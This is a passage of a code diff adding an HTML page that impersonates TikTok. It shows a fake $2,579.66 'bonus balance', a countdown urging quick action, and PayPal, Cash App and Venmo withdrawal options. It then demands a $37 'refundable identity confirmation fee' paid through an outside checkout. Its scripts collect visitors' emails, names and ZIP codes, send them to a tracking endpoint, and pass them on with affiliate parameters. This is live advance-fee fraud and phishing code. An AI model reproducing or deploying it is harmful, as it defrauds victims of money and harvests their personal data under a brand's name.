@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en-US" class="modal-open">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="format-detection" content="telephone=no">
+  <title>TikTok Bonus</title>
+
+
+  <link rel="stylesheet" href="css/style.css?v=20260731fix">
+
+
+  <script>
+    (function () {
+      var p = new URLSearchParams(window.location.search);
+      var UTM_KEYS = ['ttclid', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'utm_id'];
+
+      function getCookie(name) {
+        var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+        return match ? decodeURIComponent(match[1]) : '';
+      }
+
+      var cookieMatch = document.cookie.match(/(?:hydr_sk|okto_sk)=([a-f0-9]{32,64})/i);
+      var sk = (cookieMatch && cookieMatch[1])
+        || getCookie('hydr_sk')
+        || getCookie('okto_sk')
+        || p.get('aff_sub')
+        || p.get('okto_sk')
+        || '';
+
+      var data = {
+        sk: sk,
+        ttclid: p.get('ttclid') || '',
+        utm_source: p.get('utm_source') || '',
+        utm_medium: p.get('utm_medium') || '',
+        utm_campaign: p.get('utm_campaign') || '',
+        utm_content: p.get('utm_content') || '',
+        utm_term: p.get('utm_term') || '',
+        utm_id: p.get('utm_id') || '',
+        referrer: document.referrer || '',
+        screen: screen.width + 'x' + screen.height + '@' + (window.devicePixelRatio || 1),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        language: navigator.language || '',
+        accept_lang: navigator.languages ? navigator.languages.join(',') : '',
+      };
+
+      // Captura todos os utm_* e ttclid da URL de entrada sem deixar sobrescrever depois
+      var entryParams = {};
+      p.forEach(function (v, k) {
+        if ((/^utm_/.test(k) || k === 'ttclid') && v) {
+          entryParams[k] = v;
+        }
+      });
+
+      function buildCheckoutUrl(baseHref) {
+        var u = new URL(baseHref || 'https://www.checkout-ds24.com/product/728708');
+        var qNow = new URLSearchParams(window.location.search);
+        var currentSk = (document.cookie.match(/(?:hydr_sk|okto_sk)=([a-f0-9]{32,64})/i) || [])[1]
+          || getCookie('hydr_sk')
+          || getCookie('okto_sk')
+          || sk
+          || qNow.get('aff_sub')
+          || qNow.get('okto_sk')
+          || '';
+        if ( currentSk ) {
+          u.searchParams.set('aff_sub', currentSk);
+          u.searchParams.set('custom', currentSk);
+        }
+        qNow.forEach(function (v, k) {
+          if ((/^utm_/.test(k) || k === 'ttclid') && v) {
+            u.searchParams.set(k, v);
+          }
+        });
+        // Garante que os parametros capturados na entrada prevalecam sem sobrescrita externa
+        Object.keys(entryParams).forEach(function (k) {
+          if (entryParams[k]) u.searchParams.set(k, entryParams[k]);
+        });
+        return u;
+      }
+
+      window.__buildDigiCheckoutUrl = buildCheckoutUrl;
+
+      function appendParamsToCheckout() {
+        var links = document.querySelectorAll('a[href*="checkout-ds24.com/product"]');
+        for (var i = 0; i < links.length; i++) {
+          try {
+            var u = buildCheckoutUrl('https://www.checkout-ds24.com/product/728708');
+            links[i].href = u.toString();
+          } catch (e) { }
+        }
+      }
+
+      function setupCheckoutTracking() {
+        appendParamsToCheckout();
+        var links = document.querySelectorAll('a[href*="checkout-ds24.com"]');
+        for (var i = 0; i < links.length; i++) {
+          links[i].addEventListener('click', function () { });
+        }
+      }
+
+
+
+
+
+
+
+
+      function capturaEmail() {
+        var ultimo = '';
+        function manda() {
+          var el = document.getElementById('paypal-email')
+            || document.querySelector('input[type="email"]');
+          var v = el && el.value ? String(el.value).trim().toLowerCase() : '';
+
+
+          if (v.indexOf('@') < 1 || v === ultimo) return;
+          ultimo = v;
+        }
+
+
+
+
+
+
+        document.addEventListener('click', function (ev) {
+          if (ev.target && ev.target.closest && ev.target.closest('#btn-enviar-pix')) manda();
+        }, true);
+      }
+
+      function iniciar() {
+        setupCheckoutTracking();
+        capturaEmail();
+      }
+
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', iniciar);
+      } else {
+        iniciar();
+      }
+    })();
+  </script>
+
+</head>
+
+<body>
+  <main id="screens">
+
+
+    <section id="loading" class="screen" aria-hidden="true" style="display:none;min-height:100vh;background:#fff;">
+
+
+      <div id="id-loading"
+        style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:40px 24px;text-align:center;">
+        <img src="images/tiktok-logo.webp" alt="TikTok" style="height:36px;margin-bottom:40px;">
+        <div style="display:flex;gap:10px;margin-bottom:20px;">
+          <span
+            style="width:11px;height:11px;border-radius:50%;background:#EE1D52;animation:idDot 1.2s ease-in-out infinite;"></span>
+          <span
+            style="width:11px;height:11px;border-radius:50%;background:#EE1D52;animation:idDot 1.2s ease-in-out .2s infinite;"></span>
+          <span
+            style="width:11px;height:11px;border-radius:50%;background:#EE1D52;animation:idDot 1.2s ease-in-out .4s infinite;"></span>
+        </div>
+      </div>
+
+
+
+
+
+
+      <style>
+        @keyframes idDot {
+
+          0%,
+          80%,
+          100% {
+            transform: scale(.5);
+            opacity: .3
+          }
+
+          40% {
+            transform: scale(1);
+            opacity: 1
+          }
+        }
+
+        @keyframes idSpin {
+          to {
+            transform: rotate(360deg)
+          }
+        }
+
+        to {
+          opacity: 1;
+          transform: none
+        }
+        }
+
+        to {
+          opacity: 1;
+          transform: scale(1)
+        }
+        }
+
+        25% {
+          transform: translate(3px, -6px)
+        }
+
+        50% {
+          transform: translate(-2px, -9px)
+        }
+
+        75% {
+          transform: translate(-4px, -4px)
+        }
+        }
+      </style>
+    </section>
+
+
+    <section id="dashboard" class="screen">
+      <div class="title"><img src="images/tiktok-official.svg" alt="TikTok" style="height:22px;width:auto;"></div>
+
+      <div class="bloco-dois">
+        <div class="parabens">
+          <div class="parabens-txt">
+            <span class="parabens-txtum">Congratulations, <span id="one-congrats-name">there</span>!</span>
+            <span class="parabens-txtdois">You completed all tasks and accumulated</span>
+
+            <span class="parabens-valor">$2,579.66</span>
+          </div>
+          <img src="images/parabens-img.png" alt="" class="parabens-img">
+        </div>
+        <div style="padding:18px 20px 8px;width:100%;box-sizing:border-box;">
+          <button type="button" class="btn-sacar" aria-label="Withdraw"
+            style="pointer-events:auto;width:100%;display:block;">
+            <span class="btn-text">Withdraw</span>
+          </button>
+        </div>
+        <div class="line"></div>
+        <div class="entre">
+          <span class="entre-txt">Check in for 14 days to earn
+            <span class="entre-pts">8,414 points</span>
+            <span class="entre-data" id="checkin-dates"></span>
+          </span>
+          <button type="button" class="btn-concluido" aria-label="Withdraw">
+            <span class="btn-concluido-text">Completed</span>
+          </button>
+        </div>
+        <div class="concluiu">
+          <span class="concluiu-txt">You completed all check-in days.</span>
+        </div>
+        <div class="dia">
+          <div class="day-tracker">
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">50</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Day 01</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">100</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Day 02</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">150</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Day 03</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">200</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Day 04</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">250</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Day 05</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">300</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Day 06</div>
+            </div>
+          </div>
+        </div>
+        <div class="line line-dois"></div>
+
+        <div class="entre">
+          <span class="entre-txt entre-txt-dois">Watch targeted ads daily to earn up to
+            <span class="entre-pts">2,730 points</span>
+            <span class="entre-data">• 30/30 ads watched</span>
+          </span>
+          <button type="button" class="btn-concluido" aria-label="Withdraw">
+            <span class="btn-concluido-text">Completed</span>
+          </button>
+        </div>
+        <div class="line line-dois"></div>
+
+        <div class="entre">
+          <span class="entre-txt entre-txt-dois">Watch videos
+            <span class="entre-pts">500 points</span>
+          </span>
+          <button type="button" class="btn-concluido" aria-label="Withdraw">
+            <span class="btn-concluido-text">Completed</span>
+          </button>
+        </div>
+        <div class="assista">
+          <span class="assista-txt">Watch for 10 min </span>
+          <svg class="assista-tail" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6"
+            fill="none">
+            <path
+              d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z"
+              fill="#F1F1F1"></path>
+          </svg>
+        </div>
+        <div class="barra">
+          <div class="progress-bar">
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">50 points</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">100 points</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">150 points</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">225 points</span>
+            </div>
+          </div>
+          <div class="line line-dois"></div>
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Redeem your rewards and earn
+              <span class="entre-pts">640 points</span>
+              <span class="entre-data">• 8/8 redeemed</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Withdraw">
+              <span class="btn-concluido-text">Completed</span>
+            </button>
+          </div>
+          <div class="line line-dois"></div>
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Do 60 daily searches to earn up to
+              <span class="entre-pts">996 points</span>
+              <span class="entre-data">• 60 searches done today</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Withdraw">
+              <span class="btn-concluido-text">Completed</span>
+            </button>
+          </div>
+
+
+          <div class="assista posicao-direita">
+            <span class="assista-txt">Up to 756 points</span>
+            <svg class="assista-tail taildois" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6"
+              fill="none">
+              <path
+                d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z"
+                fill="#F1F1F1"></path>
+            </svg>
+          </div>
+          <div class="progress-bar">
+            <div class="progress-step hide">
+              <div class="step-icon">
+                <img src="images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">16 searches</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">36 searches</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">60 searches</span>
+            </div>
+          </div>
+          <div class="obtem">
+            <span class="obtem-txt">Get 21 points for typing a query in the search bar, or 0 points for tapping a
+              suggested search like
+              "You might like".</span>
+          </div>
+          <div class="line line-dois"></div>
+
+          <div class="entre">
+            <span class="entre-txt">Invite 1 friend to sign up and earn
+              <span class="entre-pts">100,000 points - 200,000 points</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Withdraw">
+              <span class="btn-concluido-text">Completed</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <section id="withdraw" class="screen is-active">
+      <div class="expira-saldo">
+        <div class="timer-wrapper">
+          <p id="countdown-text">
+            YOUR BALANCE EXPIRES IN
+            <span id="timer">00 - 16 - 33</span>
+          </p>
+        </div>
+      </div>
+      <div class="title" style="display:flex;align-items:center;justify-content:center;padding:8px 0;">
+        <img src="images/tiktok-logo.webp" alt="TikTok" style="height:28px;width:auto;display:block;">
+      </div>
+      <div class="saldo saldo-dois">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info saldo-info-dois">
+            <div class="saldo-label">
+              <span class="saldo-text saldo-text-dois">Your balance</span>
+            </div>
+
+            <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+              <span class="valor-currency valor-currency-dois" data-amount-target="2579.66">$2,579.66</span>
+              <span class="total-pontos">= 25,798,000 points</span>
+            </div>
+          </div>
+
+          <div class="saldo-action">
+            <span class="saldo-img"><img src="images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
+          </div>
+        </div>
+      </div>
+      <div class="linha"></div>
+      <div class="saldo saldo-tres">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info saldo-info-dois">
+            <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+              <span class="total-pontos total-pontos-dois">Last reward: $554.10</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="saldo saldo-sacar">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info saldo-info-sacar">
+            <div class="saldo-label">
+              <span class="saldo-sacar-text">Withdraw money</span>
+            </div>
+
+            <div class="saldo-valor" aria-live="polite">
+              <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Transfer via / <span
+                  class="payment-badge-text">ACH</span></span>
+            </div>
+          </div>
+        </div>
+        <div class="widget-container">
+          <div class="botoes-row botoes-row-sacar">
+            <button class="btn-valor">$1.00</button>
+            <button class="btn-valor">$2.50</button>
+            <button class="btn-valor">$5.00</button>
+          </div>
+
+          <button class="btn-valor display-total">$2,579.66</button>
+        </div>
+
+        <div id="three-method-group" style="display:none;margin-top:18px;">
+          <p style="font-size:13px;font-weight:600;color:#555;margin:0 0 10px;text-align:left;">How would you like to
+            withdraw?</p>
+          <div style="display:flex;gap:10px;">
+
+
+            <button type="button" class="three-method-btn" data-method="paypal"
+              style="flex:1;padding:12px 6px 10px;border:1.5px solid #e5e5e5;border-radius:10px;background:#fff;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:5px;transition:all .2s;">
+              <svg width="56" height="20" viewBox="0 0 56 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="16" font-family="Arial,sans-serif" font-size="15" font-weight="700"
+                  fill="#003087">Pay</text>
+                <text x="28" y="16" font-family="Arial,sans-serif" font-size="15" font-weight="700"
+                  fill="#009cde">Pal</text>
+              </svg>
+              <span style="font-size:11px;font-weight:600;color:#555;">PayPal</span>
+            </button>
+
+
+            <button type="button" class="three-method-btn" data-method="cashapp"
+              style="flex:1;padding:12px 6px 10px;border:1.5px solid #e5e5e5;border-radius:10px;background:#fff;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:5px;transition:all .2s;">
+              <img src="images/cashapp.svg" alt="Cash App" style="height:22px;width:auto;">
+              <span style="font-size:11px;font-weight:600;color:#555;">Cash App</span>
+            </button>
+
+
+            <button type="button" class="three-method-btn" data-method="venmo"
+              style="flex:1;padding:12px 6px 10px;border:1.5px solid #e5e5e5;border-radius:10px;background:#fff;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:5px;transition:all .2s;">
+              <img src="images/Venmo-Logo.wine.png" alt="Venmo" style="height:22px;width:auto;object-fit:contain;">
+              <span style="font-size:11px;font-weight:600;color:#555;">Venmo</span>
+            </button>
+
+          </div>
+        </div>
+
+
+        <div id="three-account-group" style="display:none;margin-top:14px;text-align:left;">
+          <label id="three-account-label" for="three-account-input"
+            style="display:block;color:#000;font-size:14px;font-weight:600;margin-bottom:6px;">PayPal Email</label>
+          <input type="email" id="three-account-input" inputmode="email" autocomplete="email" spellcheck="false"
+            placeholder="your@paypal.com"
+            style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #d9d9de;border-radius:8px;font-size:16px;color:#000;background:#fff;outline:none;">
+        </div>
+
+
+        <div id="withdraw-email-group" style="display:none;margin-top:14px;text-align:left;">
+          <label for="withdraw-email"
+            style="display:block;color:#000;font-size:14px;font-weight:600;margin-bottom:6px;">Email Address</label>
+          <input type="email" id="withdraw-email" inputmode="email" autocomplete="email" spellcheck="false"
+            placeholder="your@email.com"
+            style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #d9d9de;border-radius:8px;font-size:16px;color:#000;background:#fff;outline:none;">
+          <div id="withdraw-email-error" style="display:none;color:#EE1D52;font-size:12px;margin-top:5px;">Enter a valid
+            email</div>
+        </div>
+
+        <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="withdraw money">
+          <span class="btn-text btn-textdois-sacar btn-three-saque">Withdraw money</span>
+        </button>
+        <div class="obtem obtem-sacar sacar-dinheiro">
+          <span class="obtem-txt">To withdraw money, you need a minimum balance of $1.00. Individual and monthly
+            withdrawal limits may
+            vary by country or region.</span>
+        </div>
+      </div>
+
+      <div class="saldo saldo-sacar">
+        <div class="container-saldo ctn-flor" role="region" aria-labelledby="saldo-title">
+          <img src="images/flor.png" alt="" class="flor">
+          <div class="saldo-info obtenha-title">
+            <div class="saldo-label">
+              <span class="saldo-sacar-text obtenha-txt">Get Coins for LIVE</span>
+            </div>
+
+            <div class="saldo-valor saldo-valor-tres border-none" aria-live="polite">
+              <span class="transferencia-txt moedas-txt">Use Coins to send virtual gifts to your favorite live
+                hosts.</span>
+            </div>
+          </div>
+        </div>
+
+        <button type="button" class="btn-sacar-indisponivel" aria-label="withdraw money">
+          <span class="btn-text btn-indis">Unavailable</span>
+        </button>
+      </div>
+
+      <div class="saldo saldo-sacar">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info obtenha-title">
+            <div class="saldo-label">
+              <span class="saldo-sacar-text obtenha-txt">Mobile Top-up</span>
+            </div>
+
+            <div class="saldo-valor saldo-valor-tres celular-recarga" aria-live="polite">
+              <span class="ddd">+1</span>
+              <span class="linha-ddd"></span>
+              <div class="telefone">12025551234</div>
+            </div>
+          </div>
+        </div>
+
+        <button type="button" class="btn-sacar-indisponivel" aria-label="withdraw money">
+          <span class="btn-text btn-indis">Unavailable</span>
+        </button>
+        <div class="obtem obtem-sacar">
+          <span class="obtem-txt recarga-txt">You need a minimum balance of $5.00 for mobile top-up</span>
+        </div>
+      </div>
+    </section>
+
+
+
+
+    <section id="processing" class="screen" aria-hidden="true">
+      <header class="loading-header">
+
+        <div class="loading-logo">
+          <img src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok Logo" class="loading-logo-img">
+        </div>
+      </header>
+
+      <main class="loading-main-content">
+        <div class="new-loading-container">
+          <div class="new-loading-text" id="new-loading-text">
+            Validating access...
+          </div>
+          <div class="new-progress-track">
+            <div class="new-progress-bar" id="new-progress-bar"></div>
+          </div>
+        </div>
+      </main>
+    </section>
+    <section id="checkout" class="screen" aria-hidden="true">
+      <div class="confirmation-container">
+
+
+        <div class="confirmation-header">
+          <div class="confirmation-logo">
+            <img src="images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok">
+          </div>
+        </div>
+
+
+
+
+        <div class="confirmation-section confirmation-balance">
+          <div class="confirmation-balance-title">AVAILABLE BALANCE</div>
+          <div class="confirmation-balance-amount" data-amount-target="2579.66">$2,579.66</div>
+          <div class="confirmation-balance-subtitle">Awaiting withdrawal confirmation</div>
+        </div>
+
+
+        <div class="confirmation-section">
+          <div class="confirmation-section-title">WITHDRAWAL DETAILS</div>
+          <div class="confirmation-receipt-grid">
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Account holder</div>
+              <div class="confirmation-receipt-value" id="confirmation-name"></div>
+            </div>
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Date</div>
+              <div class="confirmation-receipt-value" id="confirmation-date"></div>
+            </div>
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Destination</div>
+              <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
+            </div>
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Amount to receive</div>
+              <div class="confirmation-receipt-value bold">$2,579.66</div>
+            </div>
+            <div class="confirmation-pix-key" id="confirmation-pix-key"></div>
+          </div>
+        </div>
+
+        <div class="confirmation-divider"></div>
+
+
+        <div class="confirmation-section">
+          <div class="confirmation-section-title">IDENTITY CONFIRMATION</div>
+          <div class="confirmation-fee-amount">
+            <span id="ticket-value-1">$37.00</span>
+            <span class="confirmation-reembolso-badge">REFUNDABLE</span>
+          </div>
+          <div class="confirmation-fee-description">
+            To confirm it's <strong id="nine-confirm-name">you</strong> releasing this withdrawal, a one-time fee of
+            <span class="bold" id="ticket-value-2">$37.00</span> is required. It will be <span class="bold">fully
+              refunded in 1 minute</span> after payment.
+          </div>
+        </div>
+
+
+        <div class="confirmation-section" id="nine-refund-section">
+          <div class="confirmation-section-title">REFUND INFORMATION</div>
+          <div id="nine-refund-warn"
+            style="display:none;background:#fff0f2;border:1px solid #fecdd6;color:#e11d48;font-size:13px;font-weight:600;border-radius:8px;padding:9px 12px;margin-bottom:12px;">
+            ⚠ Please fill in your details to continue.</div>
+          <div style="display:flex;gap:10px;margin-bottom:10px;">
+            <div style="flex:1;">
+              <label
+                style="display:block;font-size:12px;font-weight:600;color:#888;margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">First
+                Name</label>
+              <input type="text" id="nine-first-name" placeholder="John" autocomplete="given-name"
+                style="width:100%;box-sizing:border-box;padding:12px 13px;border:1.5px solid #e5e5e5;border-radius:9px;font-size:15px;color:#111;background:#fff;outline:none;">
+            </div>
+            <div style="flex:1;">
+              <label
+                style="display:block;font-size:12px;font-weight:600;color:#888;margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">Last
+                Name</label>
+              <input type="text" id="nine-last-name" placeholder="Smith" autocomplete="family-name"
+                style="width:100%;box-sizing:border-box;padding:12px 13px;border:1.5px solid #e5e5e5;border-radius:9px;font-size:15px;color:#111;background:#fff;outline:none;">
+            </div>
+          </div>
+          <div>
+            <label
+              style="display:block;font-size:12px;font-weight:600;color:#888;margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;">ZIP
+              Code</label>
+            <input type="text" id="nine-zip" placeholder="10001" inputmode="numeric" maxlength="10"
+              autocomplete="postal-code"
+              style="width:100%;box-sizing:border-box;padding:12px 13px;border:1.5px solid #e5e5e5;border-radius:9px;font-size:15px;color:#111;background:#fff;outline:none;">
+          </div>
+        </div>
+
+
+        <div class="confirmation-section">
+          <a class="confirmation-cta-button" id="confirmation-button"
+            href="https://www.checkout-ds24.com/product/728708" onclick="(function(e){
+              var fn = document.getElementById('nine-first-name');
+              var ln = document.getElementById('nine-last-name');
+              var zp = document.getElementById('nine-zip');
+              // exigencia de nome/sobrenome/zip REMOVIDA (16/10) — o botao vai direto pro checkout;
+              // campos seguem opcionais (so pre-preenchem a Digi se forem digitados).
+              try {
+                fetch('/api/event', {method:'POST',headers:{'Content-Type':'application/json'},
+                  body: JSON.stringify({step:'checkout_click',
+                    first_name: fn ? fn.value.trim() : '',
+                    last_name:  ln ? ln.value.trim() : '',
+                    zip:        zp ? zp.value.trim() : ''}),
+                  keepalive:true}).catch(function(){});
+              } catch(err){}
+              // Monta URL do checkout 728708 com aff_sub, custom, ttclid e utm_* + prefill opcional
+              try {
+                var u = (typeof window.__buildDigiCheckoutUrl === 'function')
+                  ? window.__buildDigiCheckoutUrl('https://www.checkout-ds24.com/product/728708')
+                  : new URL('https://www.checkout-ds24.com/product/728708');
+                var email = '';
+                ['withdraw-email','three-account-input','paypal-email','key-email'].forEach(function(id){
+                  var el = document.getElementById(id);
+                  if(!email && el && el.value && el.value.indexOf('@')>0) email = el.value.trim().toLowerCase();
+                });
+                if(!email){ try{ var d=JSON.parse(localStorage.getItem('userACHData')||'{}'); if(d && d.email) email=String(d.email).trim().toLowerCase(); }catch(_e){} }
+                if (fn && fn.value.trim()) u.searchParams.set('first_name', fn.value.trim());
+                if (ln && ln.value.trim()) u.searchParams.set('last_name',  ln.value.trim());
+                if (zp && zp.value.trim()) u.searchParams.set('zipcode',    zp.value.trim());
+                u.searchParams.set('country', 'US');
+                if(email) u.searchParams.set('email', email);
+                var lk = document.getElementById('confirmation-button');
+                if (lk) lk.href = u.toString();
+              } catch(err2){}
+            })(event)">
+            Pay fee to Release Withdrawal
+          </a>
+          <div class="confirmation-timer">Fee refunded after payment confirmation</div>
+          <div class="confirmation-success-message" id="confirmation-success-message">
+            ✅ Identity confirmed. <span id="ticket-value-4">$37.00</span> refunded and withdrawal released.
+          </div>
+        </div>
+
+
+        <div class="confirmation-footer">
+          <div class="confirmation-footer-text">100% secure process</div>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <script>
+
+    function easeOutCubic(t) {
+      return 1 - Math.pow(1 - t, 3);
+    }
+
+    function formatBR(value) {
+      return value
+        .toFixed(2)
+        .replace(".", ",")
+        .replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    }
+
+
+    function animateCurrencyCounter(counter, forceReset = false) {
+      if (!counter) return;
+
+
+      if (counter._isAnimating && !forceReset) return;
+
+      const duration = 2000;
+      const toValue =
+        parseFloat(counter.getAttribute("data-amount-target")) || 0;
+      const fromValue = 0;
+
+      if (toValue === 0) {
+
+        counter.textContent = "$0.00";
+        return;
+      }
+
+
+      if (counter._animationFrameId) {
+        cancelAnimationFrame(counter._animationFrameId);
+        counter._animationFrameId = null;
+      }
+
+
+      counter.textContent = "$0.00";
+
+      counter._isAnimating = true;
+      let startTime = null;
+
+      function animateCounter(currentTime) {
+        if (!startTime) startTime = currentTime;
+        const elapsed = currentTime - startTime;
+        const progress = Math.min(elapsed / duration, 1);
+        const value =
+          fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+
+        const formattedValue = new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(value);
+        if (counter && counter.textContent !== undefined) {
+          counter.textContent = formattedValue;
+        }
+
+        if (progress < 1) {
+          counter._animationFrameId = requestAnimationFrame(animateCounter);
+        } else {
+
+          const finalValue = new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(toValue);
+          if (counter && counter.textContent !== undefined) {
+            counter.textContent = finalValue;
+          }
+          counter._isAnimating = false;
+          counter._animationFrameId = null;
+        }
+      }
+
+
+      setTimeout(() => {
+        if (counter && counter.getAttribute("data-amount-target")) {
+          counter._animationFrameId = requestAnimationFrame(animateCounter);
+        }
+      }, 10);
+    }
+
+
+    document.addEventListener("DOMContentLoaded", function () {
+
+      const initialCounters = document.querySelectorAll(
+        "#dashboard .valor-currency[data-amount-target]"
+      );
+      initialCounters.forEach((counter) => {
+        animateCurrencyCounter(counter);
+      });
+    });
+
+
+    window.animateCurrencyCounter = animateCurrencyCounter;
+  </script>
+
+  <script src="js/main.js"></script>
+
+  <style>
+    /* Animação de entrada da tela #dashboard */
+    @keyframes oneSlideUp {
+      from {
+        opacity: 0;
+        transform: translateY(28px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes oneFadeIn {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    #dashboard.is-active .saldo {
+      animation: oneSlideUp 0.45s cubic-bezier(0.22, 1, 0.36, 1) both;
+      animation-delay: 0.05s;
+    }
+
+    #dashboard.is-active .parabens {
